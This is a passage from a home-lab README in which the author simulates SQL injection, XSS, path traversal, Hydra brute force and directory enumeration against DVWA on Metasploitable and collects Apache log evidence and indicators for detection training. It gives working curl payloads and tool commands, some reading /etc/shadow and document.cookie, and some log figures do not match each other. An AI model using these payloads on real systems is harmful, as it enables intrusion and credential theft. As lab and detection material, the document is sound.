# 🛡️ Module A — Web Attack Simulation

> Simulate six real-world web attacks against DVWA on Metasploitable 2, forward Apache logs to Splunk, and build detection queries to identify SQLi, XSS, LFI, brute force, directory enumeration, and encoded payloads.

[![Attacker](https://img.shields.io/badge/Attacker-Kali%20Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![SIEM](https://img.shields.io/badge/SIEM-Splunk%20Enterprise%209.x-FF6B35?style=flat-square)](https://www.splunk.com/)
[![Target](https://img.shields.io/badge/Web%20Target-Metasploitable%202-CC0000?style=flat-square)]()
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK%20v14-E3001B?style=flat-square)](https://attack.mitre.org/)
[![Status](https://img.shields.io/badge/Status-Complete-2ea44f?style=flat-square)]()

> **Part of a two-module SOC home lab.** See [Module B — Windows Event Log Analysis]

---

## Table of Contents

| # | Section |
|---|---------|
| 1 | [Executive Summary](#1-executive-summary--module-a-web-attack-simulation) |
| 2 | [Lab Architecture](#2-lab-architecture) |
| 3 | [Tools & Technologies](#3-tools--technologies) |
| 4 | [Lab Setup](#4-lab-setup--step-by-step) |
| 5 | [Module A — Web Attack Simulation](#5-module-a--web-attack-simulation) |
| 6 | [Splunk Detection Query Library](#6-splunk-detection-query-library) |
| 7 | [Alerting & Dashboard](#7-alerting--dashboard) |
| 8 | [MITRE ATT&CK Mapping](#8-mitre-attck-mapping) |
| 9 | [References](#13-references) |

---

## 1. Executive Summary — Module A: Web Attack Simulation

### 1.1 Project Overview

This project was designed to build and demonstrate the practical skills expected of a Tier 1. It is structured around three-machine isolated home lab.

**Module A — Web Attack Simulation** executes six common web-layer attacks against DVWA running on Metasploitable 2: SQL injection, cross-site scripting, local file inclusion, brute force login, directory enumeration, and Base64-encoded payload delivery. Apache access logs are forwarded in real time to Splunk on Kali Linux for detection and analysis.


### 1.2 Project Objectives

1. Simulate real-world attacks in a fully isolated lab against systems the author owns and controls
2. Generate realistic log data representing each attack type
3. Write Splunk SPL detection queries that fire on that log data
4. Map all simulated techniques to the MITRE ATT&CK framework
5. Document the investigation process at a standard that mirrors real SOC runbook quality
6. Produce a professional GitHub portfolio demonstrating practical SOC analyst capability

### 1.3 Summary of Results

| Metric | Result |
|---|---|
| Attack types simulated | 6 (SQLi, XSS, LFI, Brute Force, Dir Enum, Base64) |
| Splunk SPL detection queries | 8 queries (D-01 to D-08) |
| Splunk scheduled alerts | 4 alerts |
| MITRE ATT&CK techniques covered | 7 techniques across 5 tactics |
| Average detection latency | < 90 seconds for threshold-based alerts |

### 1.4 Skills Demonstrated

```
[x] Web attack pattern recognition in Apache access logs
[x] Splunk SPL query writing for detection engineering
[x] MITRE ATT&CK framework alignment
[x] Alert configuration and scheduling in Splunk
[x] SOC dashboard design
[x] Technical documentation at runbook standard
[x] Network log correlation
```

### 1.5 Role Relevance

Every section maps directly to skills tested in SOC analyst interviews and used in daily work:

- **Web attack patterns** — recognizing SQLi, XSS, and LFI in logs is a day-one L1 analyst requirement
- **Splunk SPL** — Splunk is the dominant enterprise SIEM; writing SPL is the core analyst task
- **MITRE mapping** — all modern SOC operations use ATT&CK for categorization, reporting, and coverage tracking

---


---

## 2. Lab Architecture

### 2.1 Machine Overview

| Role | Machine | IP Address | Key Software |
|---|---|---|---|
| Attacker + SIEM | Kali Linux 2026.3 | 192.168.1.3 | Splunk Enterprise, Metasploit, sqlmap, Hydra, Gobuster, Burp Suite |
| Web Target | Metasploitable 2 | 192.168.1.4 | Apache 2.2.8, DVWA, MySQL, PHP |

> **Network:** All three machines use VirtualBox Host-Only networking (192.168.1.0/24).
> No machine has internet access during attacks. Fully isolated lab.

### 2.2 Network Topology

```
[ METASPLOITABLE ] (Linux Victim Server)
         IP: 192.168.1.4 | Serves: Vulnerable Web Apps
               │
               │ (Attacks Web Layer)
               ▼
   ┌───────────────────────┐                    ┌────────────────────────┐
   │      KALI LINUX       │                    │       WINDOWS 11       │
   │  (Attacker & SIEM)    │◄───────────────────┤   (Endpoint Target)    │
   │                       │  (Ships Event Logs)│                        │
   │ IP: 192.168.1.3       │   via TCP 9997     │ IP: 192.168.1.12       │
   │ Runs: Metasploit/Burp │                    │ Runs: Splunk Forwarder │
   │ Runs: Splunk Core     │                    │ Logs: EID 4624/4625    │
   └───────────────────────┘                    └────────────────────────┘
               ▲                                            │
               └──────────────(Attacks Endpoint)────────────┘
                        (Brute Force / Process Spawning)
```

### 2.3 Splunk Data Architecture

```
DATA FLOW

[Apache access.log]   ---> [Agentless Syslog Forwarding on .4] ---> [Kali :9997] ---> [Index: web_logs]
[Apache error.log]    ---> [Agentless Syslog Forwarding on .4] ---> [Kali :9997] ---> [Index: web_logs]

INDEXES IN SPLUNK (on Kali 192.168.1.3:8000)

  web_logs
    sourcetypes : sys_log, apache_error
    Source      : /var/log/apache2/ on Metasploitable
    Used for    : SQLi, XSS, LFI, Brute Force, Dir Enum, B64 payloads

```

---


---

## 3. Tools & Technologies

### 3.1 Kali Linux — Attacker + SIEM (192.168.1.3)

| Tool | Version | Purpose |
|---|---|---|
| Kali Linux | 2026.3 | Attacker OS + SIEM host |
| Splunk Enterprise | 10.2.1 | Primary SIEM — detection, alerting, dashboards |

| sqlmap | 1.10.6 | Automated SQL injection |
| Hydra | 9.7 | Network login brute force |
| Gobuster | 3.8.2 | Directory enumeration |
| wfuzz | 3.1.0 | Web parameter fuzzing |
| Nikto | 2.1.6 | Web server vulnerability scanner |

| CrackMapExec | 5.4.0 | SMB brute force and Windows enumeration |
| Impacket | 0.11.0 | PsExec lateral movement simulation |
| netcat | 1.10 | Listener for reverse connections |
| Wireshark | 4.6.6 | Packet capture during attacks |

### 3.2 Metasploitable 2 — Web Target (192.168.1.4)

| Software | Purpose |
|---|---|
| Ubuntu 8.04 (base OS) | Deliberately vulnerable Linux |
| Apache 2.2 | Web server — generates access logs |
| DVWA (PHP) | Damn Vulnerable Web App — SQLi, XSS, LFI, Brute Force targets |
| MySQL 5.0.5 | Backend database for injection attacks |
| Agentless Syslog Forwarding | Ships Apache logs to Splunk on Kali |


---

## 4. Lab Setup — Step by Step

### 4.1 VirtualBox Network Configuration

```
Step 1: Open VirtualBox -> File -> Tools -> Network Manager
Step 2: Create Host-Only network
        IPv4 Address : 192.168.1.1
        Subnet Mask  : 255.255.255.0
        DHCP Server  : Disabled (static IPs only)

Step 3: Assign each VM
        VM Settings -> Network -> Adapter 1 -> Bridge Adapter
        Select the network created above

Step 4: Kali also needs internet for downloads
        VM Settings -> Network -> Adapter 2 -> NAT
        (Disable NAT before running attacks)
```

**Static IP — Kali Linux**

```bash
# Edit network config
sudo nano /etc/network/interfaces

# Add:
auto eth0
iface eth0 inet static
  address 192.168.1.3
  netmask 255.255.255.0

# Apply
sudo systemctl restart networking
ip addr show eth0
```

**Verify Connectivity**

```bash
# From Kali — test all machines
ping 192.168.1.4   # Metasploitable — should reply

# Verify DVWA is reachable
curl -I http://192.168.1.4/dvwa/
# Expected: HTTP/1.1 302 Found (redirect to login)
```

---

### 4.2 Splunk Enterprise — Install on Kali

```bash
# Download Splunk Enterprise free trial from splunk.com
# Register at: https://www.splunk.com/en_us/download/splunk-enterprise.html
# Choose: Linux .deb package

wget -O splunk.deb 'https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-Linux-x86_64.deb'
sudo dpkg -i splunk.deb

# Start Splunk and accept license
sudo /opt/splunk/bin/splunk start --accept-license

# Set admin credentials when prompted:
#   Username: admin
#   Password: myPassword123!

# Enable auto-start on boot
sudo /opt/splunk/bin/splunk enable boot-start

# Enable the receiving port (listens for Universal Forwarders)
sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:myPassword123!

# Verify Splunk is running
sudo /opt/splunk/bin/splunk status

# Open Splunk web UI
# Browse to: http://192.168.1.3:8000
# Login with admin / myPassword123!
```

**Create Indexes in Splunk UI**

```
Settings -> Indexes -> New Index (repeat for each below)

Index 1:
  Name     : web_logs
  Max Size : 10 GB
  Type     : Events

Index 2:
  Name     : wineventlog
  Max Size : 15 GB
  Type     : Events

```

---

### 4.3 Agentless Syslog Forwarding — Metasploitable (Web Target)

```bash
# On Metasploitable (192.168.1.4)
# Agentless Syslog Forwarding over UDP
nano /etc/syslog.conf
# Scroll to the very bottom of the file and add a single line directing all system logs (*.*) to send via UDP to my Kali Linux IP address on standard syslog port 514
*.* @192.168.1.3:514

# Save and close the file

# Restart the logging service to apply the updates:
sudo /etc/init.d/sysklogd restart

# Open the Apache configuration file on Metasploitable
sudo nano /etc/apache2/apache2.conf

# Scroll down or add these instructions to redirect the log streams through a pipe (|)
CustomLog "|/usr/bin/logger -t apache_access -p local7.info" combined
ErrorLog "|/usr/bin/logger -t apache_error -p local7.info"

# Restart the Apache service
sudo /etc/init.d/apache2 restart

# Run this on Metasploitable to clear the old line and spin up a highly structured version of background forwarding pipe:
sudo killall tail

# Start the optimized pipe stamping every line clearly with the apache_access tag
sudo nohup tail -f /var/log/apache2/access.log | logger -t apache_access -p local7.info &

# Open Splunk Web UI on Kali Linux
Settings -> Data Inputs -> UDP and click + Add New -> in port field 514

# Next in input setting page set proper indexing
Source type: sys_log
App Context: search
Index: main
# And then submit

```

---

---

### 4.4 DVWA Setup on Metasploitable

```bash
# SSH to Metasploitable
ssh msfadmin@192.168.1.4

# DVWA is pre-installed on Metasploitable 2
# Verify it's accessible
curl -I http://localhost/dvwa/

# If Apache isn't running:
sudo service apache2 start
sudo service mysql start

# Access DVWA from Kali browser:
# http://192.168.1.4/dvwa/setup.php
# Click: Create / Reset Database
# Login: admin / password

# IMPORTANT: Set DVWA security to LOW for all tests
# DVWA Security tab -> Submit -> select Low
```

---


---

## 5. Module A — Web Attack Simulation

### 5.1 Pre-Attack Checklist

Before each attack run:

```bash
# On Kali — confirm connectivity
ping -c 2 192.168.1.4
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.4/dvwa/

# Start Wireshark capture (optional but good evidence)
sudo wireshark -i eth0 -k -f "host 192.168.1.4" &

# Monitor Apache log live on Metasploitable (second terminal)
ssh msfadmin@192.168.1.4 "sudo tail -f /var/log/apache2/access.log"

# Start Splunk search (live monitor during attack)
# In Splunk UI: index=web_logs | tail 20 (refresh every 30s)
```

---

### 5.2 Attack 1 — SQL Injection

**Objective:** Inject SQL into web parameters to extract data from the MySQL database.
**MITRE:** T1190 — Exploit Public-Facing Application
**Target:** `http://192.168.1.4/dvwa/vulnerabilities/sqli/`

#### Attack Execution

```bash
# ---- Step 1: Manual SQL injection test ----
# Single quote test — confirms vulnerability if MySQL error appears
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit#" -vv

# ---- Step 2: Boolean-based testing ----
# TRUE condition — returns normal page
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+AND+1=1--&Submit=Submit#" -vv

# FALSE condition — returns empty/different page (confirms blind SQLi)
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+AND+1=2--&Submit=Submit#" -vv

# ---- Step 3: UNION-based column count ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+2--&Submit=Submit#" -vv
# 200 OK = 2 columns or more

curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit#" -vv
# 500 error = only 2 columns confirmed

# ---- Step 4: UNION data extraction ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null,database()--&Submit=Submit#" -vv
# Reveals: dvwa

curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null,group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()--&Submit=Submit#" -vv

# ---- Step 5: Automate with sqlmap ----
sqlmap \
  -u "http://192.168.1.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \ 
  --cookie="PHPSESSID=73c02d0243eef087f397950543f56e9e; security=low" \
  --level=3 \
  --risk=2 \
  --dbs \
  --batch \
  --random-agent \
  -o \
  --output-dir=/home/cyberzi/Desktop
```

#### Apache Log Evidence on Splunk

```
Jul  2 12:45:35 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:15:34 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1" 200 161 "-" "curl/8.20.0"
Jul  2 12:50:15 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:20:15 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=1--&Submit=Submit HTTP/1.1" 200 4398 "-" "curl/8.20.0
Jul  2 12:54:01 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:24:00 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2--&Submit=Submit HTTP/1.1" 200 4398 "-" "curl/8.20.0
Jul  2 13:07:21 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:37:20 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+2--&Submit=Submit HTTP/1.1" 200 4401 "-" "curl/8.20.0
Jul  2 13:08:07 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:38:07 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1" 200 4401 "-" "curl/8.20.0
Jul  2 13:09:02 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:39:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null,database()--&Submit=Submit HTTP/1.1" 200 4419 "-" "curl/8.20.0"
Jul  2 13:12:00 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:03:42:00 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null,group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()--&Submit=Submit HTTP/1.1" 200 4494 "-" "curl/8.20.0

# sqlmap attack log
Jul  2 13:37:27 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:04:07:27 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%28SELECT%20CONCAT%28CONCAT%280x7170786b71%2C%28CASE%20WHEN%20%282016%3D2016%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7162716b71%29%29&Submit=Submit HTTP/1.1" 200 4333 "http://192.168.1.4/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.33 Safari/537.36"

Jul  2 13:37:27 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:04:07:27 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1%27%20AND%20EXTRACTVALUE%285675%2CCONCAT%280x5c%2C0x7170786b71%2C%28SELECT%20%28ELT%285675%3D5675%2C1%29%29%29%2C0x7162716b71%29%29--%20kuNV&Submit=Submit HTTP/1.1" 200 52 "http://192.168.1.4/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.33 Safari/537.36"

Jul  2 13:37:28 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:04:07:27 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1%27%20OR%20EXTRACTVALUE%283111%2CCONCAT%280x5c%2C0x7170786b71%2C%28SELECT%20%28ELT%283111%3D3111%2C1%29%29%29%2C0x7162716b71%29%29--%20WLWv&Submit=Submit HTTP/1.1" 200 52 "http://192.168.1.4/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.33 Safari/537.36"
```

#### IOC Summary

| Indicator | Description |
|---|---|
| `UNION+SELECT`, `ORDER+BY`, `AND+1=1` in URI | SQL keywords in parameters |
| Response size variation (4921 vs 4756 bytes) | Boolean-based injection confirmed |
| HTTP 500 on ORDER BY 3 | Column count enumeration |
| `sqlmap/1.10.6` User-Agent | Automated attack tool signature |
| 15-30 requests/second from single IP | Automated tool velocity |

---

### 5.3 Attack 2 — Cross-Site Scripting (XSS)

**Objective:** Inject JavaScript into reflective input fields; demonstrate cookie theft potential.
**MITRE:** T1059.007 — JavaScript
**Target:** `http://192.168.1.4/dvwa/vulnerabilities/xss_r/`

#### Attack Execution

```bash
# ---- Step 1: Basic reflected XSS ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit" -vv

# ---- Step 2: Cookie theft simulation ----
# Set up listener on Kali first
nc -lvnp 8000 &

curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Submit=Submit" -vv

# ---- Step 3: URL-encoded variant (evasion attempt) ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit" -vv

# ---- Step 4: Double-encoded variant ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit" -vv

# ---- Step 5: onerror attribute (tag-less XSS) ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit" -vv

```

#### Apache Log Evidence on Splunk

```
Jul  2 23:38:59 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:10:06:17 -0400] "GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul  2 23:53:57 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:23:53:51 -0400] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Submit=Submit HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul  2 23:54:29 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:23:54:23 -0400] "GET /dvwa/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul  2 23:56:51 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:23:56:46 -0400] "GET /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul  2 23:56:51 192.168.1.4 apache_access: 192.168.1.3 - - [02/Jul/2026:23:56:46 -0400] "GET /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1" 302 - "-" "curl/8.20.0"
```

#### IOC Summary

| Indicator | Description |
|---|---|
| `<script>` tags in URI (raw or encoded) | XSS payload in parameter |
| `onerror=`, `onload=`, `onclick=` in URI | Event handler injection |
| `document.cookie` or `document.location` | Cookie theft attempt |
| `%3Cscript%3E` (URL-encoded `<script>`) | Single-encoding evasion |
| `%253Cscript%253E` (double-encoded) | Double-encoding evasion |

---

### 5.4 Attack 3 — Local File Inclusion (LFI) & Path Traversal

**Objective:** Manipulate file path parameters to read sensitive system files outside webroot.
**MITRE:** T1083 — File and Directory Discovery
**Target:** `http://192.168.1.4/dvwa/vulnerabilities/fi/`

#### Attack Execution

```bash
# ---- Step 1: Basic traversal — read /etc/passwd ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=../../../etc/passwd"
# Expected: Linux password file contents in response

# ---- Step 2: Deeper traversal ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=../../../../etc/shadow" -vv 

# ---- Step 3: Read Apache log (log poisoning setup) ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=../../../var/log/apache2/access.log" 

# ---- Step 4: URL-encoded traversal ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# ---- Step 5: Double-encoded traversal ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# ---- Step 6: PHP wrapper — read PHP source ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../etc/passwd"

# ---- Step 7: Automated fuzzing with wfuzz ----
wfuzz \
  -c \
  -z file,/usr/share/wordlists/wfuzz/Injections/Traversal.txt \
  --hc 404 \
  -b "PHPSESSID=73c02d0243eef087f397950543f56e9e; security=low" \
  "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=FUZZ"
```

#### Apache Log Evidence on Splunk

```
Jul 3 00:17:37 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:17:31 -0400] "GET /dvwa/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul 3 00:18:04 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:17:58 -0400] "GET /dvwa/vulnerabilities/fi/?page=../../../../etc/shadow HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul 3 00:18:36 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:18:31 -0400] "GET /dvwa/vulnerabilities/fi/?page=../../../var/log/apache2/access.log HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul 3 00:18:55 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:18:49 -0400] "GET /dvwa/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 302 - "-" "curl/8.20.0"
Jul 3 00:19:14 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:19:09 -0400] "GET /dvwa/vulnerabilities/fi/?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 302 - "-" "curl/8.20.0"

Jul 3 00:55:56 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:55:50 -0400] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 5674 "-" "Wfuzz/3.1.0"
Jul 3 00:55:56 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:55:50 -0400] "GET /dvwa/vulnerabilities/fi/?page=/../../../../../../../../../../etc/passwd^^ HTTP/1.1" 200 4758 "-" "Wfuzz/3.1.0"
Jul 3 00:55:56 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:00:55:50 -0400] "GET /dvwa/vulnerabilities/fi/?page=/../../../../../../../../../../etc/shadow^^ HTTP/1.1" 200 4758 "-" "Wfuzz/3.1.0"
```

#### IOC Summary

| Indicator | Description |
|---|---|
| `../` sequences in URI parameters | Classic path traversal |
| `%2e%2e%2f` in URI | URL-encoded traversal |
| `%252e%252e%252f` in URI | Double-encoded traversal |
| `/etc/passwd`, `/etc/shadow` in URI | Targeting sensitive Linux files |
| `php://filter` in URI | PHP stream wrapper abuse |
| Large response bytes (98234) for log file | Successful file read |
| Sequential requests from Wfuzz | Automated traversal fuzzing |

---

### 5.5 Attack 4 — Brute Force Login

**Objective:** Systematically attempt username/password pairs against the DVWA login form.
**MITRE:** T1110.001 — Brute Force: Password Guessing
**Target:** `http://192.168.1.4/dvwa/vulnerabilities/brute/`

#### Attack Execution

```bash
# ---- Step 1: Single manual attempt to observe the response ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " \
 "http://192.168.1.4/dvwa/vulnerabilities/brute/?username=admin&password=wrongpassword&Login=Login"
# Note: Failure message in body, status 200 (DVWA doesn't use 401)
# Success indicated by different response size or body text

# ---- Step 2: Hydra HTTP GET form brute force ----
sudo hydra \
  -l admin \
  -P /usr/share/wordlists/john.txt \
  192.168.1.4 \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=admin&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=73c02d0243eef087f397950543f56e9e; security=low:F=Username and/or password incorrect." \
  -t 16 \
  -V \
  -o /home/cyberzi/Desktop/bruteforce-output.txt

# ---- Step 3: Watch the log in real time during attack ----
# In Splunk: index=web_logs | search "brute" | tail 50 | refresh

# Hydra output shows:
[80][http-get-form] host: 192.168.1.4   login: admin   password: password
```

#### Apache Log Evidence on splunk (sample — 380+ entries total)

```
Jul 3 01:21:40 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:01:21:34 -0400] "GET /dvwa/vulnerabilities/brute/?username=admin&password=wrongpassword&Login=Login HTTP/1.1" 200 4572 "-" "curl/8.20.0"
Jul 3 02:00:38 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:00:33 -0400] "GET /dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login HTTP/1.0" 200 4572 "-" "Mozilla/5.0 (Hydra)"
Jul 3 02:00:38 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:00:33 -0400] "GET /dvwa/vulnerabilities/brute/?username=admin&password=%23!comment:%20revised%20to%20also%20include%20common%20website%20passwords%20from%20public%20lists&Login=Login HTTP/1.0" 200 4572 "-" "Mozilla/5.0 (Hydra)"
Jul 3 02:00:38 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:00:33 -0400] "GET /dvwa/vulnerabilities/brute/?username=admin&password=%23!comment:&Login=Login HTTP/1.0" 200 4572 "-" "Mozilla/5.0 (Hydra)"
Jul 3 02:00:38 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:00:33 -0400] "GET /dvwa/vulnerabilities/brute/?username=admin&password=%23!comment:%20(that%20is,%20more%20common%20passwords%20are%20listed%20first).%20%20It%20has%20been&Login=Login HTTP/1.0" 200 4572 "-" "Mozilla/5.0 (Hydra)"
```

---

### 5.6 Attack 5 — Directory Enumeration

**Objective:** Discover hidden files and directories on the web server using wordlist-based scanning.
**MITRE:** T1595.003 — Active Scanning: Wordlist Scanning
**Target:** `http://192.168.1.4/`

#### Attack Execution

```bash
# ---- Step 1: Gobuster — fast directory scan ----
gobuster dir \
  -u http://192.168.1.4 \  
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \ 
  -t 50 \
  -x php,txt,html,bak,zip,conf \
  -o /home/cyberzi/Desktop/My_SOC_project/02-attack-simulations/05-directory-enumeration/gobuster-output.txt \
  --timeout 10s

# ---- Step 2: dirb — slower but thorough ----
dirb http://192.168.1.4/ \
  /usr/share/wordlists/dirb/common.txt \
  -o /home/cyberzi/Desktop/My_SOC_project/02-attack-simulations/05-directory-enumeration/dirb-output.txt

# ---- Step 3: Nikto — combines dir scan with vuln checks ----
nikto \
  -h http://192.168.1.4 \
  -output /home/cyberzi/Desktop/My_SOC_project/02-attack-simulations/05-directory-enumeration/nikto-output.txt \
  -Format txt

```

#### Apache Log Evidence on Splunk (sample)

```
Jul  3 02:24:34 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:24:30 -0400] "GET /0aa5ec31-2ad1-4d64-84f4-648a4dc91c2b HTTP/1.1" 404 316 "-" "gobuster/3.8.2"
Jul  3 02:24:34 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:24:30 -0400] "GET /%23%20Attribution-Share%20Alike%203.0%20License.%20To%20view%20a%20copy%20of%20this.zip HTTP/1.1" 404 345 "-" "gobuster/3.8.2"
Jul  3 02:24:34 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:24:30 -0400] "GET /%23.txt HTTP/1.1" 404 285 "-" "gobuster/3.8.2"
Jul  3 02:24:34 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:24:30 -0400] "GET /%23.conf HTTP/1.1" 404 286 "-" "gobuster/3.8.2"
Jul  3 02:24:34 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:02:24:30 -0400] "GET /%23%20directory-list-2.3-medium.txt HTTP/1.1" 404 311 "-" "gobuster/3.8.2"
[... 1500,000+ requests over 5 minutes ...]
```

**Key Observation:** 35,000+ requests in ~4 minutes = ~490 req/sec. 97% return 404. Requests are alphabetically/wordlist-ordered, not random navigation. User-Agent is `gobuster/3.8.2`.

---

### 5.7 Attack 6 — Base64 Encoded Payload Delivery

**Objective:** Deliver attack payloads encoded in Base64 to simulate WAF evasion and obfuscation.
